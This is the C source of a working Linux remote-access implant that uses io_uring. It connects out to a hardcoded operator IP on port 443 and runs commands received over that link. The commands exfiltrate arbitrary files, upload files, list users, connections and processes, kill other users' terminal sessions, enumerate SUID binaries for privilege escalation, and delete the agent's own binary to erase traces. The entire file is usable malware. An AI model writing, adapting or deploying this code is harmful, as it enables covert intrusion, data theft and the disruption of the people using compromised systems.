#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <liburing.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <utmp.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <ctype.h>

#define SERVER_IP "192.168.200.132" //CHANGE THIS
#define SERVER_PORT 443 // RECOMMENDEED PORT 443
#define QUEUE_DEPTH 16
#define BUF_SIZE 65536

int send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0);
        io_uring_submit(ring);

        struct io_uring_cqe *cqe;
        io_uring_wait_cqe(ring, &cqe);
        int ret = cqe->res;
        io_uring_cqe_seen(ring, cqe);

        if (ret <= 0) return ret;
        sent += ret;
    }
    return sent;
}

ssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    struct io_uring_cqe *cqe;

    io_uring_prep_recv(sqe, sockfd, buf, len, 0);
    io_uring_submit(ring);

    io_uring_wait_cqe(ring, &cqe);
    ssize_t ret = cqe->res;
    io_uring_cqe_seen(ring, cqe);

    return ret;
}

int read_file_uring(struct io_uring *ring, const char *path, char *buf, size_t bufsize) {
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int fd, ret;
    off_t offset = 0;
    size_t total = 0;

    sqe = io_uring_get_sqe(ring);
    io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0);
    io_uring_submit(ring);
    io_uring_wait_cqe(ring, &cqe);
    fd = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    if (fd < 0) return fd;

    while (total < bufsize - 1) {
        sqe = io_uring_get_sqe(ring);
        io_uring_prep_read(sqe, fd, buf + total, bufsize - 1 - total, offset);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);
        ret = cqe->res;
        io_uring_cqe_seen(ring, cqe);
        if (ret <= 0) break;
        offset += ret;
        total += ret;
    }
    buf[total] = 0;
    close(fd);
    return total;
}

void sanitize_cmd(char *cmd) {
    size_t len = strlen(cmd);
    while (len > 0 && (cmd[len-1] == '\n' || cmd[len-1] == '\r' || cmd[len-1] == ' '))
        cmd[--len] = 0;
}

void trim_leading(char **str) {
    while (**str && isspace(**str)) (*str)++;
}

void cmd_users(struct io_uring *ring, int sockfd) {
    char buf[8192];
    int ret = read_file_uring(ring, "/var/run/utmp", buf, sizeof(buf));
    if (ret <= 0) {
        const char *err = "Error reading /var/run/utmp\n";
        send_all(ring, sockfd, err, strlen(err));
        return;
    }
    int count = ret / sizeof(struct utmp);
    struct utmp *entries = (struct utmp*)buf;

    char out[8192];
    size_t out_pos = 0;
    out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, "Logged users:\n");
    for (int i = 0; i < count; i++) {
        if (entries[i].ut_type == USER_PROCESS) {
            out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
                                "%-8s %-8s\n", entries[i].ut_user, entries[i].ut_line);
            if (out_pos > sizeof(out) - 100) break;
        }
    }
    send_all(ring, sockfd, out, out_pos);
}

void cmd_ss(struct io_uring *ring, int sockfd) {
    char buf[8192];
    int ret = read_file_uring(ring, "/proc/net/tcp", buf, sizeof(buf));
    if (ret <= 0) {
        const char *err = "Error reading /proc/net/tcp\n";
        send_all(ring, sockfd, err, strlen(err));
        return;
    }

    char out[16384];
    size_t out_pos = 0;
    out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
                       "Local Address          Remote Address         State  UID\n");

    char *line = strtok(buf, "\n");
    line = strtok(NULL, "\n");
    while (line) {
        unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid;
        sscanf(line,
            "%u: %8X:%X %8X:%X %X %*s %*s %*s %u",
            &sl, &local_ip, &local_port, &rem_ip, &rem_port, &st, &uid);

        char local_str[32], rem_str[32];
        snprintf(local_str, sizeof(local_str), "%d.%d.%d.%d:%d",
                 (local_ip & 0xFF), (local_ip >> 8) & 0xFF,
                 (local_ip >> 16) & 0xFF, (local_ip >> 24) & 0xFF,
                 local_port);
        snprintf(rem_str, sizeof(rem_str), "%d.%d.%d.%d:%d",
                 (rem_ip & 0xFF), (rem_ip >> 8) & 0xFF,
                 (rem_ip >> 16) & 0xFF, (rem_ip >> 24) & 0xFF,
                 rem_port);

        out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
                            "%-22s %-22s %-5X %u\n", local_str, rem_str, st, uid);
        if (out_pos > sizeof(out) - 100) break;

        line = strtok(NULL, "\n");
    }
    send_all(ring, sockfd, out, out_pos);
}

void cmd_get(struct io_uring *ring, int sockfd, const char *path) {
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int fd;

    sqe = io_uring_get_sqe(ring);
    io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0);
    io_uring_submit(ring);
    io_uring_wait_cqe(ring, &cqe);
    fd = cqe->res;
    io_uring_cqe_seen(ring, cqe);

    if (fd < 0) {
        char err[256];
        snprintf(err, sizeof(err), "Failed to open %s: %s\n", path, strerror(-fd));
        send_all(ring, sockfd, err, strlen(err));
        return;
    }

    char buf[BUF_SIZE];
    ssize_t ret;
    off_t offset = 0;

    while (1) {
        sqe = io_uring_get_sqe(ring);
        io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);
        ret = cqe->res;
        io_uring_cqe_seen(ring, cqe);

        if (ret <= 0) break;

        offset += ret;

        if (send_all(ring, sockfd, buf, ret) <= 0) {
            break;
        }
    }

    close(fd);
}

void cmd_recv(struct io_uring *ring, int sockfd, const char *args) {
    char remote_path[256];
    long expected_size = 0;

    char buf[BUF_SIZE];

    if (sscanf(args, "%255s %ld", remote_path, &expected_size) != 2 || expected_size <= 0) {
        const char *msg = "Usage: recv <remote_path> <size>\n";
        send_all(ring, sockfd, msg, strlen(msg));
        return;
    }

    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;

    sqe = io_uring_get_sqe(ring);
    io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    io_uring_submit(ring);
    io_uring_wait_cqe(ring, &cqe);
    int fd = cqe->res;
    io_uring_cqe_seen(ring, cqe);

    if (fd < 0) {
        char err[128];
        snprintf(err, sizeof(err), "Failed to open %s: %s\n", remote_path, strerror(-fd));
        send_all(ring, sockfd, err, strlen(err));
        return;
    }

    off_t offset = 0;
    while (offset < expected_size) {
        size_t to_read = (expected_size - offset > BUF_SIZE) ? BUF_SIZE : (expected_size - offset);

        sqe = io_uring_get_sqe(ring);
        io_uring_prep_recv(sqe, sockfd, buf, to_read, 0);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);

        ssize_t received = cqe->res;
        io_uring_cqe_seen(ring, cqe);

        if (received <= 0) {
            break;
        }

        sqe = io_uring_get_sqe(ring);
        io_uring_prep_write(sqe, fd, buf, received, offset);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);
        io_uring_cqe_seen(ring, cqe);

        offset += received;
    }

    close(fd);
}

void cmd_help(struct io_uring *ring, int sockfd) {
    const char *msg =
        "Available commands:\n"
        "  get <path>                   - See file\n"
        "  put <local_path> <remote_path> - Upload file\n"
        "  users                       - View logged users\n"
        "  ss/netstat                  - View connections\n"
        "  ps                          - List processes\n"
        "  me                          - Show agent PID and TTY\n"
        "  kick <pts>                  - Kill session by pts\n"
        "  privesc                     - Enumerate SUID binaries\n"
        "  selfdestruct                - Delete agent and exit\n"
        "  exit                        - Close connection (without deleting the agent)\n"
        "  help                        - This help\n";
    send_all(ring, sockfd, msg, strlen(msg));
}

/*
This cmd_me function cannot be 100% based on io_uring because it uses traditional calls
(such as getpid and ttyname) to obtain information about the process and the terminal.

The only part that is performed asynchronously with io_uring is sending data via socket,
through the send_all function.
*/

void cmd_me(struct io_uring *ring, int sockfd) {
    char buf[128];
    pid_t pid = getpid();
    char *tty = ttyname(STDIN_FILENO);
    if (!tty) tty = "(none)";

    snprintf(buf, sizeof(buf), "PID: %d\nTTY: %s\n", pid, tty);
    send_all(ring, sockfd, buf, strlen(buf));
}

/*
This cmd_ps function uses traditional calls (such as opendir, readdir and read)

to traverse the /proc directory and read the /proc/[pid]/comm files,
since io_uring does not offer native support for directory reading operations and reading files with variable offsets.

Therefore, reading directories and files cannot be performed
asynchronously with io_uring.

However, data sending operations via socket are performed asynchronously
using io_uring, through the send_all function.

*/

void cmd_ps(struct io_uring *ring, int sockfd) {
    DIR *dir = opendir("/proc");
    if (!dir) {
        send_all(ring, sockfd, "Failed to open /proc\n", 21);
        return;
    }

    struct dirent *entry;
    char out[16384];
    size_t pos = 0;
    pos += snprintf(out + pos, sizeof(out) - pos, "PID     CMD\n");

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR) continue;

        char *endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;

        char comm_path[64];
        snprintf(comm_path, sizeof(comm_path), "/proc/%ld/comm", pid);

        char name[256];
        int ret = read_file_uring(ring, comm_path, name, sizeof(name));
        if (ret > 0) {
            name[strcspn(name, "\n")] = 0;
            pos += snprintf(out + pos, sizeof(out) - pos, "%-7ld %s\n", pid, name);
            if (pos > sizeof(out) - 100) break;
        }
    }

    closedir(dir);
    send_all(ring, sockfd, out, pos);
}

/*
This cmd_kick function uses traditional calls (such as opendir, readdir, readlink and kill)
because io_uring does not natively support directory reading and symbolic link reading operations. 
Therefore, these operations cannot be performed asynchronously with io_uring.

However, data sending operations via socket are performed asynchronously using
io_uring, via the send_all function.
*/

void cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) {
    char out[4096];
    if (!arg_raw) arg_raw = "";

    char *arg = (char *)arg_raw;
    trim_leading(&arg);

    if (strlen(arg) == 0) {
        DIR *d = opendir("/dev/pts");
        if (!d) {
            snprintf(out, sizeof(out), "Failed to open /dev/pts: %s\n", strerror(errno));
            send_all(ring, sockfd, out, strlen(out));
            return;
        }
        struct dirent *entry;
        size_t pos = 0;
        pos += snprintf(out + pos, sizeof(out) - pos, "Active pts sessions:\n");
        while ((entry = readdir(d)) != NULL) {
            if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
                pos += snprintf(out + pos, sizeof(out) - pos, "pts/%s\n", entry->d_name);
                if (pos > sizeof(out) - 100) break;
            }
        }
        closedir(d);
        send_all(ring, sockfd, out, pos);
        return;
    }

    char target_tty[64];
    snprintf(target_tty, sizeof(target_tty), "/dev/pts/%s", arg);

    DIR *proc = opendir("/proc");
    if (!proc) {
        snprintf(out, sizeof(out), "Failed to open /proc: %s\n", strerror(errno));
        send_all(ring, sockfd, out, strlen(out));
        return;
    }

    int found_pid = 0;
    struct dirent *dent;
    while ((dent = readdir(proc)) != NULL) {
        char *endptr;
        long pid = strtol(dent->d_name, &endptr, 10);
        if (*endptr != '\0') continue;

        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/%ld/fd", pid);
        DIR *fd_dir = opendir(fd_path);
        if (!fd_dir) continue;

        struct dirent *fd_ent;
        while ((fd_ent = readdir(fd_dir)) != NULL) {
            if (fd_ent->d_name[0] == '.') continue;
            char link_path[512];
            char link_target[512];
            ssize_t link_len;

            snprintf(link_path, sizeof(link_path), "%s/%s", fd_path, fd_ent->d_name);
            link_len = readlink(link_path, link_target, sizeof(link_target) -1);
            if (link_len < 0) continue;
            link_target[link_len] = 0;

            if (strcmp(link_target, target_tty) == 0) {
                found_pid = (int)pid;
                break;
            }
        }
        closedir(fd_dir);
        if (found_pid) break;
    }
    closedir(proc);

    if (!found_pid) {
        snprintf(out, sizeof(out), "No process found using %s\n", target_tty);
        send_all(ring, sockfd, out, strlen(out));
        return;
    }

    if (kill(found_pid, SIGKILL) == 0) {
        snprintf(out, sizeof(out), "Killed process %d using %s\n", found_pid, target_tty);
    } else {
        snprintf(out, sizeof(out), "Failed to kill process %d: %s\n", found_pid, strerror(errno));
    }
    send_all(ring, sockfd, out, strlen(out));
}

void cmd_privesc(struct io_uring *ring, int sockfd) {
    DIR *dir = opendir("/usr/bin");
    if (!dir) {
        send_all(ring, sockfd, "Failed to open /usr/bin\n", 23);
        return;
    }

    struct dirent *entry;
    char out[16384];
    size_t pos = 0;
    pos += snprintf(out + pos, sizeof(out) - pos, "Potential SUID binaries:\n");

    while ((entry = readdir(dir)) != NULL) {
        char path[512];
        snprintf(path, sizeof(path), "/usr/bin/%s", entry->d_name);

        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        struct io_uring_cqe *cqe;
        struct statx stx;

        io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, &stx);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);

        if (cqe->res == 0 && (stx.stx_mode & S_ISUID)) {
            pos += snprintf(out + pos, sizeof(out) - pos, "%s\n", path);
            if (pos > sizeof(out) - 100) break;
        }
        io_uring_cqe_seen(ring, cqe);
    }
    closedir(dir);
    send_all(ring, sockfd, out, pos);
}

/*
This self-destruct function uses traditional calls
(readlink) because io_uring does not natively support
symlink reading operations. Therefore, to get the path
of the current executable, it is necessary to resort to traditional syscalls.

But since it is a self-destruct function
I see no other reason to also be 100% io_uring here
*/

 void cmd_selfdestruct(struct io_uring *ring, int sockfd) {
    const char *msg = "Agent will self-destruct\n";
    send_all(ring, sockfd, msg, strlen(msg));

    char exe_path[512];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
    if (len > 0) {
        exe_path[len] = '\0';

        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        struct io_uring_cqe *cqe;

        io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0);
        io_uring_submit(ring);
        io_uring_wait_cqe(ring, &cqe);
        if (cqe->res < 0) {
            char err[128];
            snprintf(err, sizeof(err), "Unlink failed: %s\n", strerror(-cqe->res));
            send_all(ring, sockfd, err, strlen(err));
        }
        io_uring_cqe_seen(ring, cqe);
    }
    exit(0);
}

void cmd_exit(struct io_uring *ring, int sockfd) {
    const char *msg = "Agent disconnecting and exiting\n";
    send_all(ring, sockfd, msg, strlen(msg));

    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    io_uring_prep_close(sqe, sockfd);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    io_uring_cqe_seen(ring, cqe);

    io_uring_queue_exit(ring);

    _exit(0);
}

void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
    sanitize_cmd(cmd);

    if (strncmp(cmd, "get ", 4) == 0) {
        cmd_get(ring, sockfd, cmd + 4);

    } else if (strncmp(cmd, "recv ", 5) == 0) {
        char *remote_path = cmd + 5;
        trim_leading(&remote_path);
        cmd_recv(ring, sockfd, remote_path);

    } else if (strcmp(cmd, "users") == 0) {
        cmd_users(ring, sockfd);

    } else if (strcmp(cmd, "ss") == 0 || strcmp(cmd, "netstat") == 0) {
        cmd_ss(ring, sockfd);

    } else if (strcmp(cmd, "ps") == 0) {
        cmd_ps(ring, sockfd);

    } else if (strcmp(cmd, "me") == 0) {
        cmd_me(ring, sockfd);

    } else if (strncmp(cmd, "kick", 4) == 0) {
        cmd_kick(ring, sockfd, cmd + 4);

    } else if (strcmp(cmd, "privesc") == 0) {
        cmd_privesc(ring, sockfd);

    } else if (strcmp(cmd, "selfdestruct") == 0) {
        cmd_selfdestruct(ring, sockfd);

    } else if (strcmp(cmd, "exit") == 0) {
        cmd_exit(ring, sockfd);

    } else if (strcmp(cmd, "help") == 0) {
        cmd_help(ring, sockfd);

    } else {
        send_all(ring, sockfd, "[*] 404 Command not found [*]\n", 29);
    }
}


int main() {
    struct io_uring ring;
    struct sockaddr_in addr;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int sockfd;
    int ret;

    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
        perror("io_uring_queue_init");
        exit(1);
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        io_uring_queue_exit(&ring);
        exit(1);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_connect(sqe, sockfd, (struct sockaddr *)&addr, sizeof(addr));
    io_uring_submit(&ring);

    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0 || cqe->res < 0) {
        fprintf(stderr, "connect() failed: %s\n", ret < 0 ? strerror(-ret) : strerror(-cqe->res));
        io_uring_cqe_seen(&ring, cqe);
        io_uring_queue_exit(&ring);
        exit(1);
    }
    io_uring_cqe_seen(&ring, cqe);

    printf("[+] Connected to %s:%d\n", SERVER_IP, SERVER_PORT);

    char buf[BUF_SIZE];
    ssize_t n;

    while (1) {
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_recv(sqe, sockfd, buf, sizeof(buf) - 1, 0);
        io_uring_submit(&ring);

        ret = io_uring_wait_cqe(&ring, &cqe);
        if (ret < 0) {
            perror("io_uring_wait_cqe");
            break;
        }

        if (cqe->res <= 0) {
            io_uring_cqe_seen(&ring, cqe);
            break;
        }

        n = cqe->res;
        io_uring_cqe_seen(&ring, cqe);

        buf[n] = '\0';
        process_cmd(&ring, sockfd, buf);
    }

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_close(sqe, sockfd);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    io_uring_queue_exit(&ring);
    printf("[+] Connection closed\n");

    return 0;
}
